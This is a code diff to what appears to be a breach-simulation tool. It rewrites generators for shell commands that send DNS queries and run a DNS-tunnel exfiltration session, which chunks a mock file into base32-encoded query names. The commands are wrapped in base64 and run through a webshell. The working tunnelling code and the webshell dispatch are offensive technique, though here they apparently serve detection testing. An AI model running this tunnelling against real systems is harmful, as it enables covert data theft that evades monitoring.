@@ -196,23 +196,46 @@ def dns_query_command(
     fqdn: str,
     *,
     timeout: float = 0.05,
+    sent_marker_prefix: str | None = None,
     suppress_errors: bool = True,
 ) -> str:
     """UDP/53 DNS query via python3 stdlib."""
-    t = max(1, int(max(timeout, 1.0)))
+    t = max(0.001, float(timeout))
+    marker_prefix = str(sent_marker_prefix or "").strip()
     script = (
-        "import socket,struct,uuid;"
-        f"fqdn={fqdn!r};resolver={resolver!r};port=53;"
-        "def enc(n):"
-        " b=b'';"
-        " [b:=b+struct.pack('B',len(l))+l.encode() for l in n.rstrip('.').split('.')];"
-        " return b+b'\\x00';"
-        "txn=struct.unpack('!H',uuid.uuid4().bytes[:2])[0];"
-        "pkt=struct.pack('!HHHHHH',txn,0x0100,1,0,0,0)+enc(fqdn)+struct.pack('!HH',1,1);"
-        f"s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.settimeout({t});"
-        "s.sendto(pkt,(resolver,port));s.close()"
+        "import socket\n"
+        "import struct\n"
+        "import uuid\n"
+        "\n"
+        f"fqdn = {fqdn!r}\n"
+        f"resolver = {resolver!r}\n"
+        "port = 53\n"
+        f"timeout = {t}\n"
+        f"marker_prefix = {marker_prefix!r}\n"
+        "\n"
+        "def encode_qname(name: str) -> bytes:\n"
+        "    out = b\"\"\n"
+        "    name = (name or \"\").rstrip(\".\")\n"
+        "    for label in name.split(\".\"):\n"
+        "        if not label:\n"
+        "            continue\n"
+        "        b = label.encode(\"ascii\", errors=\"ignore\")\n"
+        "        out += struct.pack(\"B\", len(b)) + b\n"
+        "    return out + b\"\\x00\"\n"
+        "\n"
+        "txn_id = struct.unpack(\"!H\", uuid.uuid4().bytes[:2])[0]\n"
+        "header = struct.pack(\"!HHHHHH\", txn_id, 0x0100, 1, 0, 0, 0)\n"
+        "question = encode_qname(fqdn) + struct.pack(\"!HH\", 1, 1)\n"
+        "packet = header + question\n"
+        "\n"
+        "sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
+        "sock.settimeout(timeout)\n"
+        "sock.sendto(packet, (resolver, port))\n"
+        "sock.close()\n"
+        "if marker_prefix:\n"
+        "    print(f\"{marker_prefix}{fqdn}\")\n"
     )
-    command = f"python3 -c {shlex.quote(script)}"
+    command = _python3_b64_exec_command(script)
     if suppress_errors:
         return f"{command} 2>/dev/null || true"
     return command
@@ -230,36 +253,70 @@ def dns_tunnel_session_command(
 ) -> str:
     """Run full DNS tunnel exfil session on remote host — sendto only, no DNS recv."""
     script = (
-        "import base64,os,socket,struct,time,uuid,tempfile;"
-        f"T={target!r};D={domain!r};F={mock_filename!r};C={int(chunk_size)};"
-        f"M={float(payload_mb)};I={float(send_interval)};P={MOCK_PAYLOAD_PATTERN!r};"
-        "def b32(x):return base64.b32encode(x).decode().lower().rstrip('=');"
-        "def qn(n):"
-        " o=b'';"
-        " [o:=o+struct.pack('B',len(l))+l.encode() for l in n.rstrip('.').split('.')];"
-        " return o+b'\\x00';"
-        "def mk(f):"
-        " i=struct.unpack('!H',uuid.uuid4().bytes[:2])[0];"
-        " return struct.pack('!HHHHHH',i,0x0100,1,0,0,0)+qn(f)+struct.pack('!HH',1,1);"
-        "def pay():"
-        " t=max(C,int(M*1024*1024));return (P*((t+len(P)-1)//len(P)))[:t];"
-        "def snd(s,fq):s.sendto(mk(fq),(T,53));"
-        "with tempfile.TemporaryDirectory() as td:"
-        " fp=os.path.join(td,F);open(fp,'wb').write(pay());"
-        " s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);"
-        " snd(s,'strt-'+b32(F.encode())+'.'+D);"
-        " seq=0;"
-        " with open(fp,'rb') as fh:"
-        "  while True:"
-        "   ch=fh.read(C);"
-        "   if not ch:break;"
-        "   snd(s,'idx-'+format(seq,'04d')+'-'+b32(ch)+'.'+D);"
-        "   seq+=1;"
-        "   if I>0:time.sleep(I);"
-        " snd(s,'end-0.'+D);s.close();"
-        "print('DNS_TUNNEL_SESSION_DONE')"
+        "import base64\n"
+        "import os\n"
+        "import socket\n"
+        "import struct\n"
+        "import time\n"
+        "import uuid\n"
+        "import tempfile\n"
+        "\n"
+        f"T = {target!r}\n"
+        f"D = {domain!r}\n"
+        f"F = {mock_filename!r}\n"
+        f"C = {int(chunk_size)}\n"
+        f"M = {float(payload_mb)}\n"
+        f"I = {float(send_interval)}\n"
+        f"P = {MOCK_PAYLOAD_PATTERN!r}\n"
+        "\n"
+        "def b32(x: bytes) -> str:\n"
+        "    return base64.b32encode(x).decode(\"ascii\").lower().rstrip(\"=\")\n"
+        "\n"
+        "def qname(name: str) -> bytes:\n"
+        "    out = b\"\"\n"
+        "    name = (name or \"\").rstrip(\".\")\n"
+        "    for label in name.split(\".\"):\n"
+        "        if not label:\n"
+        "            continue\n"
+        "        b = label.encode(\"ascii\", errors=\"ignore\")\n"
+        "        out += struct.pack(\"B\", len(b)) + b\n"
+        "    return out + b\"\\x00\"\n"
+        "\n"
+        "def make_query(fqdn: str) -> bytes:\n"
+        "    txn_id = struct.unpack(\"!H\", uuid.uuid4().bytes[:2])[0]\n"
+        "    header = struct.pack(\"!HHHHHH\", txn_id, 0x0100, 1, 0, 0, 0)\n"
+        "    question = qname(fqdn) + struct.pack(\"!HH\", 1, 1)\n"
+        "    return header + question\n"
+        "\n"
+        "def build_payload() -> bytes:\n"
+        "    total = max(C, int(M * 1024 * 1024))\n"
+        "    repeats = (total + len(P) - 1) // len(P)\n"
+        "    return (P * repeats)[:total]\n"
+        "\n"
+        "def send(sock: socket.socket, fqdn: str) -> None:\n"
+        "    sock.sendto(make_query(fqdn), (T, 53))\n"
+        "    print(\"DNS_TUNNEL_SENT:\" + fqdn)\n"
+        "\n"
+        "with tempfile.TemporaryDirectory() as td:\n"
+        "    fp = os.path.join(td, F)\n"
+        "    open(fp, \"wb\").write(build_payload())\n"
+        "    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
+        "    send(sock, \"strt-\" + b32(F.encode(\"ascii\", errors=\"ignore\")) + \".\" + D)\n"
+        "    seq = 0\n"
+        "    with open(fp, \"rb\") as fh:\n"
+        "        while True:\n"
+        "            ch = fh.read(C)\n"
+        "            if not ch:\n"
+        "                break\n"
+        "            send(sock, \"idx-\" + format(seq, \"04d\") + \"-\" + b32(ch) + \".\" + D)\n"
+        "            seq += 1\n"
+        "            if I > 0:\n"
+        "                time.sleep(I)\n"
+        "    send(sock, \"end-0.\" + D)\n"
+        "    sock.close()\n"
+        "print(\"DNS_TUNNEL_SESSION_DONE\")\n"
     )
-    command = f"python3 -c {shlex.quote(script)}"
+    command = _python3_b64_exec_command(script)
     if suppress_errors:
         return f"{command} 2>/dev/null || true"
     return command
@@ -297,6 +354,7 @@ def dns_query_command_evidence(
     fqdn: str,
     *,
     timeout: float = 0.05,
+    sent_marker_prefix: str | None = None,
     suppress_errors: bool = True,
 ) -> dict[str, str]:
     """Metadata describing the DNS query command dispatched through the webshell."""
@@ -304,6 +362,7 @@ def dns_query_command_evidence(
         resolver,
         fqdn,
         timeout=timeout,
+        sent_marker_prefix=sent_marker_prefix,
         suppress_errors=suppress_errors,
     )
     return {
